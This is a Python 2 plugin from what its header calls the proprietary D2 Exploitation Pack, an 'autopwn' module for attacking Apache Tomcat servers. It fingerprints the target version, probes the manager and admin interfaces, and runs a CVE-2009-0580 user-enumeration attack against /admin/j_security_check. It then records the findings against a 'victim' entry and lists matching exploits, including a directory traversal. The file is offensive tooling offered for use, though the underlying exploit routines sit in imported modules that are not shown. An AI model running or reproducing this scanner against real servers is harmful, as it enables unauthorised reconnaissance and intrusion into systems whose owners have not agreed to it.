#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import appli.tomcat
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
    'Tomcat 4.1.0->4.1.37, 5.5.0->5.5.26, and 6.0.0->6.0.16': ['Apache Tomcat Directory Traversal Vulnerability', 'd2sec_tomcat'],
  }

  def exploit(self, target, port):
    result = ''
    discovery = [
      appli.tomcat.check_version,
      appli.tomcat.manager,
      appli.tomcat.admin,
    ]
    self.log.info('Tomcat server scan %s:%s' % (target, port))
    try:
      for fct in discovery:
        infos = fct(target, port)
        if infos:
          for info in infos:
            result += '%s' % info
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    # CVE-2009-0580 - User enumeration
    infos = appli.tomcat.enum_login(target, port, '/admin/j_security_check', [])
    if infos:
      for info in infos:
        result += '%s' % info
    self.db.db_unique_info(self.victim, self.service, 'Tomcat Server Scanner', 'autopwn_tomcat', result)
    self.log.debug('%s' % result)
    self.list_exploits()
